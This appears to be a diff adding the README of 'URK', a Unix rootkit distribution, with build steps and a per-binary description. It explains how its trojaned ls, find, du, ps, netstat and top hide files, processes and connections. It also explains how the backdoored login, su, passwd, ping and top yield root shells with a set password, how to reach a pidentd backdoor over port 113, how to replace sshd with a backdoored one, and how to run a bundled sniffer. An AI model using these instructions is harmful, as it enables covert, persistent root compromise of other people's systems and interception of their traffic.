@@ -1,0 +1,148 @@
+URK Release 0.9.6 (Universial Root Kit)
+
+K2's Root Kit.   ktwo@ktwo.ca
+
+Send me bug reports/ideas/money/food.  You can find me on the Undernet on
+#inNUENdo. Have fun.
+
+Thanks to plaguez for his ssh/sshd.
+
+This is all BETA code, there will be many changes to the structure of all
+the binaries soon.  This code should run on most every UNIX you may encounter.
+All of the code should be extremely portable. Only login/pcs/pident may have\
+some difficulty compiling.
+	
+The idea is to create a directory somplace to store all of your files
+(eg. /usr/man/man1/xxxxxxxx).  Now what you are todo is put things the real
+binaries in your directory to be executed.  Then my programs will filter the
+output based on what you define in the urk.conf file.  Easy eh?
+
+There are some compiler derivitives that you can define, -DURK_DEFAULT this
+option will build into the binaries defaut, read more about it later, also
+-DHIDE will enable hidden urk.conf support, what this dose is make the binaries
+read a urk.conf that has been modifed by the inv program.  Ok, example, run
+inv urk.conf urk.conf.inv, then place the urk.conf.inv someplace and edit urk.h
+to point to it, then the information there will be readable from the binaries,
+but I dont think most people will be able to ;)  you can run inv urk.conf.inv
+urk.conf to rebuild the original conf file. THIS CODE IS NEW, I just did this
+so i'll be fixing it up soon, so I dont want to hear any flame on it.
+
+================================================================================
+
+Most of this is self explanitory, ask me for help I guess.
+
+To build the distrobution replace the "(sys-type)" with the system type,
+	
+	make
+	cd login
+	make (sys-type)
+	cd ../pidentd*
+	make (sys-type)
+	cd ../sniffer/
+	make (sys-type)
+	cd ../top*
+	Configure ; make
+	cd ../ssh*
+	configure ; make
+
+These steps may be intergraded into a single make in a future release.
+
+NOTE: 	most every binary is dependent on file.c and pipe.c, so you must do the
+	initial make first.
+	
+================================================================================
+urk.h
+	This file is where you should put your default entries for locations
+	of system binaries, filters and passwords.  You do not have to use
+	defaults though.  If you do not want the information built into the
+	binary's comment out the -DURK_DEFAULT in the Makefile.all.  Keep in
+        mind that the urk.conf file will be used first, then if the data is bad,
+        the default data will be attempted.
+
+urk.conf
+	This file is what defines what to filter and where the locations
+	of the original binaries are.  So a good item for the file_filters may
+	be urk.conf itself ;)  Now the urk.conf file looks like a windows ini
+	file so	it should be familure to most of you.
+	
+Makefile.all
+	Edit your compilation options here.  It is currently setup for gcc.	
+
+find/
+	Find will not show any files that are in the file_filters= section.
+	This includes subdirectories, ie. you can create a directory that is
+	filterd, then all of the contents will be hiden aswell.
+
+du/
+	Very simaler to find.  du also uses the find_filters section.
+
+ls/	
+	ls was somewhat difficlut, in that the formatting is very different from
+	time to time (ls -C,ls --verbose,...).  So this presented some
+	interesting code.  ls also uses the find_filters section.
+
+login/
+	login is well tested and should prove a very nice backdoor, however,
+	the output from login is so carefully scrutinized by everybody on a
+	system, it is most likely to be one of the first things detected.
+	login uses the su_pass section for it's passwd.
+	Tested on,
+		IRIX5.X,IRIX6.x
+		Solaris2.X
+		BSDI 3
+		FreeBSD 2.2
+		Linux 2.0.X,Linux 1.1.X,Lunux 2.1.X
+		HP-UX 9/10
+		OSF/1
+		
+
+netstat/
+	netstat is another filter, it obviously uses a differnt key for the
+	filter (net_filters)
+
+ps/
+	ps is somewhat differnt.  for the other binaries you may keep thier name
+	the same, but be adviesed that you should rename ps to soemthing unique
+	and add that unique name for ps in the ps_filters section, so that ps
+	itself will be mask'd.
+	
+ping/ su/ and passwd/
+	all three of these are local backdoors.  execute any one of them with
+	the command line argument being your su_pass and you will get a
+	rootshell (su my_passwd_here) ,make sure that they are setuid root.
+	
+sniffer/
+	The sniffer that is included is pcs, this is a libpcap based sniffer so
+	I included that aswell, I havent tested it much for I have just added
+	it in this release.  I have successfully compiled it under IRIX,Solaris
+	Linux.  Anyhow, one day I may code my own sniffer, but for now, 
+	halflife's pcs is excellent.
+	Tested on,
+		IRIX5.X,IRIX6.x
+		Solaris2.X
+		Linux 2.0.X,Lunux 2.1.X
+		HP-UX 9/10
+
+pidentd-2.8.3/
+	This is a remote backdoor in pidentd (2.8.1).
+	Telnet to the target port 113 (defauld ident port). type in "23, 113"
+	press enter.  You will get a passwd: prompt, enter the same password
+	that u define'd in the urk.conf.  You will not get a prompt ">" so just
+	type away and ignore that.  And csh is a little flakey, I suggest using
+	bash if at all possiable.
+	Tested on,
+		IRIX5.X,IRIX6.x
+		Solaris2.X
+		Linux 2.0.X,Lunux 2.1.X
+		
+ssh-1.2.26/   I Have moved this out of the primary distrobution.
+	This is a remote backdoor in ssh.  Compile on the target system, and
+	compile the ssh client on your system.  Replace the target's sshd, then
+	to login as root, use your ssh client and simply "ssh -l root target".
+
+top-3.5beta8/
+	This is top, it will follow the standerds with the urk.conf/urk.h files
+	and filter out whatever ps filters.  Also, top, being suid will give a
+	rootshell by typing "top my_root_pw" that was set in the urk.conf.
+	
+================================================================================
